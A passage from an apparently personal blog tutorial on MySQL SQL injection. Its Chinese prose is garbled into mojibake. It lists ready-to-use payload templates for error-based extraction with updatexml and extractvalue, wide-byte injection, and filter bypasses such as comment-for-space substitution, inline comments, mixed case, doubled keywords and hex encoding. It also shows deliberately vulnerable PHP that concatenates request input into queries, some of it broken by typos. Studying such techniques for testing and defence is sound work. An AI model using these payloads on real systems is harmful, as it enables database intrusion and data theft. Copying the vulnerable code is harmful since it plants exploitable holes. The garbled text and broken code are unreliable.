<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤-4"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤-4" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>æŸ¥åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,database()),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png" class="" title="image-20210725110316413" loading="lazy">

<ol start="2">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png" class="" title="image-20210725111053307" loading="lazy">

<ol start="3">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;è¡¨å&#39; limit 0,1)),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png" class="" title="image-20210725111329442" loading="lazy">

<ol start="4">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,(select åˆ—å from è¡¨å limit 0,1)),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png" class="" title="image-20210725111528458" loading="lazy">

<h3 id="æ³¨æ„äº‹é¡¹-4"><a href="#æ³¨æ„äº‹é¡¹-4" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol>
<li>updataxmlå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šUPDATEXML(XML_document, XPath_string, new_value)</p>
<p>å…¶ä¸­ï¼š</p>
<p>XML_documentæ˜¯Stringå‹æ•°æ®ï¼Œæ˜¯XMLæ–‡æ¡£çš„æ–‡ä»¶æ ¼å¼</p>
<p>XPath_stringæ˜¯ï¼ˆXpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼‰æ˜¯XMLæ–‡æ¡£è·¯å¾„</p>
<p>new_valueæ˜¯Stringå‹æ•°æ®ï¼Œç”¨äºæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p>
<p><code>updatexml</code>å¯ä»¥å¯¹XMLæ–‡æ¡£è¿›è¡Œæ›´æ–°</p>
<h2 id="æŠ¥é”™æ³¨å…¥-extractvalue"><a href="#æŠ¥é”™æ³¨å…¥-extractvalue" class="headerlink" title="æŠ¥é”™æ³¨å…¥-extractvalue"></a>æŠ¥é”™æ³¨å…¥-extractvalue</h2><p><code>extractvalue</code>ä¹Ÿæ˜¯ä¸€ç§æŠ¥é”™æ³¨å…¥ï¼Œå®ƒä¸<code>updatexml</code>æ³¨å…¥çš„åŸç†ä¸€æ ·</p>
<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤-5"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤-5" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>æŸ¥åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,database()))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png" class="" title="image-20210725144530805" loading="lazy">

<ol start="2">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png" class="" title="image-20210725145257615" loading="lazy">

<ol start="3">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;è¡¨å&#39; limit 0,1)))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png" class="" title="image-20210725145450328" loading="lazy">

<ol start="4">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,(select åˆ—å from åº“å limit 0,1)))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png" class="" title="image-20210725150025086" loading="lazy">

<h3 id="æ³¨æ„äº‹é¡¹-5"><a href="#æ³¨æ„äº‹é¡¹-5" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol>
<li>extractvalueå‡½æ•°</li>
</ol>
<p>è¯­æ³•æ ¼å¼ï¼šEXTRACTVALUE(XML_document, XPath_string)</p>
<p><code>extrctvalue</code>å‡½æ•°å¯ä»¥å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>å¼€å‘è€…ä¸ºäº†é˜²æ­¢å‡ºç°SQLæ³¨å…¥æ”»å‡»ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®ç”¨addslashesç­‰å‡½æ•°è¿›è¡Œè¿‡æ»¤ã€‚</p>
<p>addslashesç­‰å‡½æ•°é»˜è®¤å¯¹å•å¼•å·ç­‰å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…æ³¨å…¥ã€‚</p>
<p>å®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› æ˜¯ï¼šMySQLåœ¨ä½¿ç”¨è¿‡GBKç¼–ç çš„æ—¶å€™ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç å¤§äº128ï¼Œä¼šè®¤ä¸ºå‰ä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œä¼šå°†åé¢çš„è½¬ä¹‰å­—ç¬¦<code>\</code>â€œåƒæ‰â€ï¼Œå°†å‰ä¸¤ä¸ªå­—ç¬¦æ‹¼æ¥ä¸ºæ±‰å­—ï¼Œè¿™æ ·å°±å¯ä»¥å°†SQLè¯­å¥é—­åˆï¼Œé€ æˆå®½å­—èŠ‚æ³¨å…¥ã€‚</p>
<h3 id="payloadæ¨¡æ¿ä¸æ­¥éª¤-6"><a href="#payloadæ¨¡æ¿ä¸æ­¥éª¤-6" class="headerlink" title="payloadæ¨¡æ¿ä¸æ­¥éª¤"></a>payloadæ¨¡æ¿ä¸æ­¥éª¤</h3><ol>
<li>æŸ¥åº“å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,database(),3</code></pre>

<ol start="2">
<li>æŸ¥è¡¨å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x74657374ï¼ˆåº“åçš„åå…­è¿›åˆ¶ï¼Œè¿™é‡Œå•å¼•å·ä¼šè½¬ä¹‰ï¼‰</code></pre>

<ol start="3">
<li>æŸ¥åˆ—å</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;0x74657374 and table_name&#x3D;0x666c6167</code></pre>

<ol start="4">
<li>æŸ¥å­—æ®µ</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(åˆ—åï¼Œåˆ—åï¼ŒÂ·Â·Â·),3 from è¡¨å</code></pre>

<h3 id="æ³¨æ„äº‹é¡¹-6"><a href="#æ³¨æ„äº‹é¡¹-6" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>åˆ©ç”¨å®½å­—èŠ‚æ³¨å…¥åŸç†ï¼Œåªè¦ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç å¤§äº<code>128</code>ï¼ŒMySQLæ•°æ®åº“å°±ä¼šè®¤ä¸ºå‰ä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œå¯ä»¥æ­£å¸¸é—­åˆSQLè¯­å¥è¿›è¡Œæ³¨å…¥</p>
<p>è¿™æ ·å°±å¯ä»¥ç”¨ASCIIç ä¸º129çš„å­—ç¬¦è¿›è¡Œæ³¨å…¥ï¼Œå…¶URLç¼–ç ä¸º<code>%81</code></p>
<p>å½“ç„¶æ³¨å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯<code>%81</code>ï¼Œåªè¦æ˜¯å¤§äº<code>%80</code>ï¼Œä¸”åœ¨æ±‰å­—çš„ç¼–ç å†…å³å¯</p>
<h2 id="SQLæ³¨å…¥ç»•è¿‡"><a href="#SQLæ³¨å…¥ç»•è¿‡" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡"></a>SQLæ³¨å…¥ç»•è¿‡</h2><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><p>æ ¹æ®åº”ç”¨çš„è¿‡æ»¤è§„åˆ™ï¼Œä¼šå°†ç©ºæ ¼åŠ å…¥é»‘åå•ï¼Œä½†æ˜¯ç©ºæ ¼å­˜åœ¨å¤šç§ç»•è¿‡æ–¹å¼ï¼Œå¸¸è§çš„åŒ…æ‹¬<code>/**/</code>ã€<code>åˆ¶è¡¨ç¬¦</code>ã€<code>æ¢è¡Œç¬¦</code>ã€<code>æ‹¬å·</code>ã€<code>åå¼•å·</code>æ¥ä»£æ›¿ç©ºæ ¼</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#æ¼æ´ä»£ç ç¤ºä¾‹</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>&#x2F;**&#x2F;</li>
</ul>
<p>MySQLæ•°æ®åº“ä¸­å¯ä»¥ç”¨&#x2F;**&#x2F;ï¼ˆæ³¨é‡Šç¬¦ï¼‰æ¥ä»£æ›¿ç©ºæ ¼ï¼Œå°†ç©ºæ ¼ç”¨æ³¨é‡Šç¬¦ä»£æ›¿åï¼ŒSQLè¯­å¥å¯ä»¥æ­£å¸¸è¿è¡Œ</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png" class="" title="image-20210726125323913" loading="lazy">

<ul>
<li>åˆ¶è¡¨ç¬¦</li>
</ul>
<p>åœ¨MySQLæ•°æ®åº“ä¸­ï¼Œå¯ä»¥ç”¨åˆ¶è¡¨ç¬¦ï¼ˆ%09ã€%0Bï¼‰æ¥ä»£æ›¿ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œåœ¨URLä¼ è¾“ä¸­éœ€è¦ç¼–ç </p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png" class="" title="image-20210726125809221" loading="lazy">

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png" class="" title="image-20210726125830823" loading="lazy">

<ul>
<li>æ¢è¡Œç¬¦</li>
</ul>
<p>MySQLæ•°æ®åº“æ”¯æŒæ¢è¡Œæ‰§è¡ŒSQLè¯­å¥ï¼Œå¯ä»¥åˆ©ç”¨æ¢è¡Œç¬¦ï¼ˆ%0Aã€%0Cï¼‰ä»£æ›¿ç©ºæ ¼ï¼Œæ¢è¡Œç¬¦ä¹Ÿæ˜¯ä¸å¯è§å­—ç¬¦ï¼Œåœ¨URLä¼ è¾“ä¸­éœ€è¦ç¼–ç </p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png" class="" title="image-20210726125908271" loading="lazy">

<ul>
<li>æ‹¬å·</li>
</ul>
<p>åœ¨MySQLæ•°æ®åº“ä¸­ï¼Œä»»ä½•æŸ¥è¯¢ä¸­éƒ½å¯ä»¥ä½¿ç”¨æ‹¬å·åµŒå¥—SQLè¯­å¥</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png" class="" title="image-20210726130541927" loading="lazy">

<p>MySQLæ•°æ®åº“ä¸­æœ‰ä¸€ä¸ªç‰¹æ€§ã€‚</p>
<p>åœ¨æ¡ä»¶è¯­å¥ä¸­ï¼Œåœ¨<code>where id=1</code>åé¢åŠ <code>=1</code>æˆä¸º<code>where id=1=1</code>ï¼Œå°±æ˜¯å¯¹å‰é¢æ‰€æœ‰ç»“æœä¸1ï¼ŒæŸ¥è¯¢ç»“æœä¸åŸæ¥ä¸€æ ·</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png" class="" title="image-20210726131604921" loading="lazy">

<p>åœ¨<code>where id=1</code>åé¢åŠ <code>=0</code>æˆä¸º<code>where id=1=0</code>ï¼Œå°±æ˜¯å¯¹å‰é¢çš„æ‰€æœ‰ç»“æœä¸0ï¼ˆå–åï¼‰ï¼Œå³æŸ¥è¯¢çš„ç»“æœé™¤å»åŸæœ‰æŸ¥è¯¢ç»“æœçš„å…¶ä»–æ•°æ®</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png" class="" title="image-20210726131919320" loading="lazy">

<p>åˆ©ç”¨ä»¥ä¸Šç‰¹æ€§ï¼Œæ„é€ æ‹¬å·ç»•è¿‡payloadå°±å¯ä»¥è¿›è¡Œboolç›²æ³¨ï¼Œè·å¾—æ•°æ®åº“çš„ä¿¡æ¯</p>
<pre class="language-none"><code class="language-none">id&#x3D;1&#x3D;(ascii(mid(database()from(1)for(1)))&#x3D;116)</code></pre>

<p>å½“æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºtæ—¶ï¼Œä¸Šé¢ç­‰ä»·äº<code>id=1=1</code></p>
<ul>
<li>`</li>
</ul>
<p>MySQLä¸­çš„åå¼•å·æ˜¯ä¸ºäº†åŒºåˆ†MySQLçš„ä¿ç•™å­—ä¸æ™®é€šå­—è€Œå¼•å…¥çš„ç¬¦å·ï¼Œåå¼•å·å¯ä»¥ä»£æ›¿ç©ºæ ¼</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png" class="" title="image-20210726145309481" loading="lazy">

<h3 id="å†…è”æ³¨é‡Šç»•è¿‡"><a href="#å†…è”æ³¨é‡Šç»•è¿‡" class="headerlink" title="å†…è”æ³¨é‡Šç»•è¿‡"></a>å†…è”æ³¨é‡Šç»•è¿‡</h3><p>MySQLä¼šæ‰§è¡Œæ”¾åœ¨<code>/*! Â·Â·Â·*/</code>ä¸­çš„è¯­å¥ã€‚</p>
<p><code>/*! 50010Â·Â·Â·/</code>ä¹Ÿå¯ä»¥æ‰§è¡Œä½äºå…¶ä¸­çš„SQLè¯­å¥ï¼Œå…¶ä¸­50010è¡¨ç¤ºSQLç‰ˆæœ¬ä¸º5.00.10ã€‚å½“MySQLæ•°æ®åº“çš„å®é™…ç‰ˆæœ¬å·å¤§äºå†…è”æ³¨é‡Šä¸­çš„ç‰ˆæœ¬å·æ—¶ï¼Œå°±ä¼šæ‰§è¡Œå†…è”æ³¨é‡Šä¸­çš„ä»£ç ã€‚</p>
<p>å½“å‰MySQLæ•°æ®åº“çš„ç‰ˆæœ¬æ˜¯5.7.26ï¼Œä½¿ç”¨æ­¤ç‰ˆæœ¬çš„æ•°æ®åº“è¿›è¡ŒéªŒè¯</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png" class="" title="image-20210726150609315" loading="lazy">

<h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><p>æ ¹æ®åº”ç”¨ç¨‹åºçš„è¿‡æ»¤è§„åˆ™ï¼Œé€šå¸¸ä¼šé’ˆå¯¹æ¶æ„å…³é”®å­—è®¾ç½®é»‘åå•ï¼Œå¦‚æœå­˜åœ¨æ¶æ„å…³é”®å­—ï¼Œåº”ç”¨ç¨‹åºå°±ä¼šé€€å‡ºè¿è¡Œã€‚</p>
<p>åœ¨è¿‡æ»¤è§„åˆ™ä¸­å¯èƒ½å­˜åœ¨è¿‡æ»¤ä¸å®Œæ•´æˆ–è€…åªè¿‡æ»¤å°å†™æˆ–è€…å¤§å†™çš„æƒ…å†µï¼Œæ²¡æœ‰é’ˆå¯¹å¤§å°å†™ç»„åˆè¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡å¤§å°å†™æ··å†™payloadçš„æ–¹å¼æ¥ç»•è¿‡å…³é”®å­—ã€‚</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#æ¼æ´ä»£ç ç¤ºä¾‹</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>ç›´æ¥ä¼ å…¥<code>select</code>ä¼šå›æ˜¾ERRORï¼Œå½“ä¼ å…¥<code>SeLeCt</code>æ—¶æ­£å¸¸å›æ˜¾</p>
<h3 id="åŒå†™å…³é”®è¯ç»•è¿‡"><a href="#åŒå†™å…³é”®è¯ç»•è¿‡" class="headerlink" title="åŒå†™å…³é”®è¯ç»•è¿‡"></a>åŒå†™å…³é”®è¯ç»•è¿‡</h3><p>æ ¹æ®åº”ç”¨ç¨‹åºçš„è¿‡æ»¤è§„åˆ™ï¼Œæœ‰æ—¶ä¸æ˜¯ç›´æ¥å°†å…³é”®è¯åŠ å…¥é»‘åå•ï¼Œè€Œæ˜¯åˆ©ç”¨<code>preg_replace</code>å‡½æ•°å°†å…³é”®è¯æ›¿æ¢</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#æ¼æ´ä»£ç ç¤ºä¾‹</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isser</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/i'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>å¦‚æœç›´æ¥ä¼ å…¥<code>select</code>å°†ä¼šè¢«æ›¿æ¢æˆç©ºè€ŒæŠ¥é”™ï¼Œä½†æ˜¯<code>preg_replace</code>å‡½æ•°å¹¶æ²¡æœ‰è¿›è¡Œå¤šæ¬¡è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡åŒå†™å…³é”®è¯çš„æ–¹å¼ç»•è¿‡</p>
<p>å½“ä¼ å…¥<code>seselectlect</code>æ—¶ï¼Œä¸­é—´çš„<code>select</code>è¢«æ›¿æ¢æˆç©ºï¼Œå®é™…ä¼ å…¥çš„æ˜¯<code>select</code>ï¼ŒæˆåŠŸç»•è¿‡</p>
<h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li><p>åŒé‡URLç¼–ç ç»•è¿‡</p>
</li>
<li><p>åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡</p>
</li>
</ul>
<p>MySQLæ•°æ®åº“å¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶ï¼Œä¼šå¯¹åå…­è¿›åˆ¶çš„æ•°æ®è¿›è¡Œè‡ªåŠ¨è½¬æ¢</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png" class="" title="image-20210726153906638" loading="lazy">

<p>å¦‚æœPHPé…ç½®ä¸­å¼€å¯äº†GPCï¼ŒGPCä¼šè‡ªåŠ¨ä¼šå•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œè¿™æ ·æ³¨å…¥å°±æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>ä½†æ˜¯å¦‚æœå°†æ³¨å…¥çš„æ•°æ®è½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œå¯ä»¥æ­£å¸¸æ³¨å…¥</p>
<pre class="language-none"><code class="language-none">#åŸæ¥ä¼ å…¥çš„æ³¨å…¥è¯­å¥
id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</code></pre>

<p>è¿›è¿‡GPCè½¬ä¹‰åï¼ŒSQLè¯­æ³•å°±ä¼šå‘ç”Ÿé”™è¯¯ï¼Œä¸èƒ½æ­£å¸¸æ³¨å…¥</p>
<pre class="language-none"><code class="language-none">#å®é™…ä¼ å…¥çš„æ³¨å…¥è¯­å¥
id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;\&#39;test\&#39;;</code></pre>

<p>åˆ©ç”¨ç¼–ç ç»•è¿‡</p>
<pre class="language-none"><code class="language-none">#åˆ©ç”¨ç‰¹æ€§å°†è¡¨ååå…­è¿›åˆ¶ç¼–ç åä¼ å…¥ï¼Œä¸éœ€è¦å•å¼•å·
id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x74657374;</code></pre>

<h3 id="ç­‰ä»·å‡½æ•°å­—ç¬¦æ›¿æ¢ç»•è¿‡"><a href="#ç­‰ä»·å‡½æ•°å­—ç¬¦æ›¿æ¢ç»•è¿‡" class="headerlink" title="ç­‰ä»·å‡½æ•°å­—ç¬¦æ›¿æ¢ç»•è¿‡"></a>ç­‰ä»·å‡½æ•°å­—ç¬¦æ›¿æ¢ç»•è¿‡</h3><ul>
<li>ç­‰ä»·ç­‰å·</li>
</ul>
<p>ç”¨<code>like</code>æˆ–<code>in</code>ä»£æ›¿<code>=</code></p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png" class="" title="image-20210726154407760" loading="lazy">

<ul>
<li>ç­‰ä»·é€—å·</li>
</ul>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png" class="" title="image-20210726154551164" loading="lazy">

<ul>
<li><p>ç­‰ä»·å‡½æ•°</p>
<p>sleepå‡½æ•°ä¸benchmarkå‡½æ•°ç­‰ä»·</p>
<p>asciiå‡½æ•°ä¸hexã€binã€convå‡½æ•°ç­‰ä»·</p>
<p>group_concatå‡½æ•°ä¸concat_wså‡½æ•°ç­‰ä»·</p>
<p>updatexmlå‡½æ•°ä¸extractvalueå‡½æ•°ç­‰ä»·</p>
</li>
</ul>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">ç«Ÿç„¶æœ‰ç”¨ï¼Ÿï¼èµï¼</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/Alipay.png"><img loading="lazy" src="/images/Alipay.png" alt="æ”¯ä»˜å®" title="æ”¯ä»˜å®"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a href="/images/WechatPay.png"><img loading="lazy" src="/images/WechatPay.png" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>Nayst</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/" title="SQLæ³¨å…¥">https://www.nayst.top/2021/08/30/SQL%E6%B3%A8%E5%85%A5/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" 